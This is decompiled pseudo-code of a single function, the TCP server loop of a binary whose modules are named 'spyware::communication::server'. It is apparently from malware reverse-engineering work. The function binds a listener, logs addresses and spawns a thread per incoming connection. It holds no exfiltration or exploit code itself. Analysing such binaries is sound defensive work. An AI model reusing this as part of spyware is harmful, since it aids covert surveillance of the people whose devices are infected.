
  fn spyware::communication::server::run_server::hf575f6adb91dbfb6(arg1: i16) -> fn(arg1: *mut i64, arg2: *mut i64) -> i64

{
    let mut var_10a: i16 = arg1;
    let mut var_108: *mut *mut c_void = &data_4b8d10;
    let mut var_100: fn(arg1: *mut i64, arg2: *mut i64) -> i64 =
        _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h412b806372427b66;
    let mut var_f8: *mut i16 = &var_10a;
    let var_f0: fn(arg1: *mut i16, arg2: *mut i8) -> u64 = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u16$GT$::fmt::hca7847b10460df25;
    let mut var_d8: *mut c_void = &data_4b8ca0;
    let var_d0: fn(arg1: *mut i64, arg2: *mut i64) -> i64 = 2;
    let var_b8: i64 = 0;
    let var_c8: *const *mut *mut c_void = &var_108;
    let var_c0: i64 = 2;
    let mut var_48: ();
    core::option::Option$LT$T$GT$::map_or_else::h31b26472792d6da3(&var_48, &var_d8);
    std::net::tcp::TcpListener::bind::he40e587fcbf7a57c(&var_d8, &var_48);
    
    if (var_d8 & 1) != 0
    {
        return var_d0;
    }
    
    let mut fd_1: i32 = *var_d8[4];
    let mut var_78: i16;
    std::net::tcp::TcpListener::local_addr::h3c98181fce942115(&var_78, &fd_1);
    let mut var_e0: *mut i32;
    let mut var_a8: *mut i64;
    let mut var_a0: fn(arg1: *mut i8) -> i64;
    let mut var_98: i128;
    
    if var_78 != 2
    {
        let var_68: i128;
        let var_88_1: i128 = var_68;
        var_98 = var_78;
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 3
        {
            var_a8 = &var_98;
            var_a0 = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Debug$GT$::fmt::h5869d6b0d96760be;
            var_d8 = &data_4b8cc0;
            let var_d0_2: i64 = 1;
            let var_b8_2: i64 = 0;
            let var_c8_2: *mut *mut i64 = &var_a8;
            let var_c0_2: i64 = 1;
            let rax_6: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8d20);
            var_108 = "spyware::communication::serverUn…";
            var_100 = 0x1e;
            var_f8 = "spyware::communication::serverUn…";
            let var_f0_2: i64 = 0x1e;
            let var_e8_2: i64 = rax_6;
            log::__private_api::log::h13afddf373bd7d7f(&var_d8, 3, &var_108);
        }
    }
    else
    {
        let var_70: *mut i32;
        var_e0 = var_70;
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() != 0
        {
            var_a8 = &var_e0;
            var_98 = &var_a8;
            *var_98[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h2d488762f4f56181;
            var_d8 = &data_4b8cd0;
            let var_d0_1: i64 = 2;
            let var_b8_1: i64 = 0;
            let var_c8_1: *mut i128 = &var_98;
            let var_c0_1: i64 = 1;
            let rax_4: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8d38);
            var_108 = "spyware::communication::serverUn…";
            var_100 = 0x1e;
            var_f8 = "spyware::communication::serverUn…";
            let var_f0_1: i64 = 0x1e;
            let var_e8_1: i64 = rax_4;
            log::__private_api::log::h13afddf373bd7d7f(&var_d8, 1, &var_108);
        }
        
        core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_e0);
    }
    
    var_e0 = &fd_1;
    
    loop
    {
        _$LT$std..net..tcp..Incoming$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::hd0d557571d3ab98d(&var_a8, &var_e0);
        let rax_7: i32 = var_a8;
        
        if rax_7 == 0
        {
            let mut fd: i32 = *var_a8[4];
            
            if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 3
            {
                std::net::tcp::TcpStream::peer_addr::h9ccf6949693ba95c(&var_108, &fd);
                let rax_13: i16 = var_108;
                
                if rax_13 == 2
                {
                    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::hf7372bfdd8ef8cfe(fd);
                    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::hf7372bfdd8ef8cfe(
                        fd_1);
                    return var_100;
                }
                
                *var_98[6] = *var_108[6];
                *var_98[2] = *var_108[2];
                let zmm0_2: i128 = var_f8;
                let var_58_1: i128 = zmm0_2;
                var_98 = rax_13;
                *var_98[8] = var_100;
                let var_88_2: i128 = zmm0_2;
                var_78 = &var_98;
                let var_70_1: fn(arg1: *mut i8) -> i64 = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Display$GT$::fmt::hb8f0b665671134da;
                var_d8 = &data_4b8cf0;
                let var_d0_4: i64 = 1;
                let var_b8_4: i64 = 0;
                let var_c8_4: *mut i16 = &var_78;
                let var_c0_4: i64 = 1;
                let rax_14: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8d68);
                var_108 = "spyware::communication::serverUn…";
                var_100 = 0x1e;
                var_f8 = "spyware::communication::serverUn…";
                let var_f0_4: i64 = 0x1e;
                let var_e8_4: i64 = rax_14;
                log::__private_api::log::h13afddf373bd7d7f(&var_d8, 3, &var_108);
            }
            
            let var_c8_5: i64 = -0x8000000000000000;
            var_d8 = nullptr;
            let var_b0_1: i8 = 0;
            std::thread::Builder::spawn_unchecked::h25f5435683f80577(&var_108, &var_d8);
            core::result::Result$LT$T$C$E$GT$::expect::h3c826feadda953db(&var_d8, &var_108);
            core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$$GT$::hc1f2d39e06124517(&var_d8);
        }
        else
        {
            if rax_7 != 1
            {
                break;
            }
            
            var_78 = var_a0;
            
            if core::sync::atomic::atomic_load::h8c88032dab18ab12() != 0
            {
                var_98 = &var_78;
                *var_98[8] = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
                var_d8 = &data_4b8d00;
                let var_d0_3: i64 = 1;
                let var_b8_3: i64 = 0;
                let var_c8_3: *mut i128 = &var_98;
                let var_c0_3: i64 = 1;
                let rax_10: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8d98);
                var_108 = "spyware::communication::serverUn…";
                var_100 = 0x1e;
                var_f8 = "spyware::communication::serverUn…";
                let var_f0_3: i64 = 0x1e;
                let var_e8_3: i64 = rax_10;
                log::__private_api::log::h13afddf373bd7d7f(&var_d8, 1, &var_108);
            }
            
            core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_78);
        }
    }
    
    std::panicking::begin_panic::hb01f6b74cc5cddb3("Server closed unexpectedlyfailed…");
    /* no return */
}
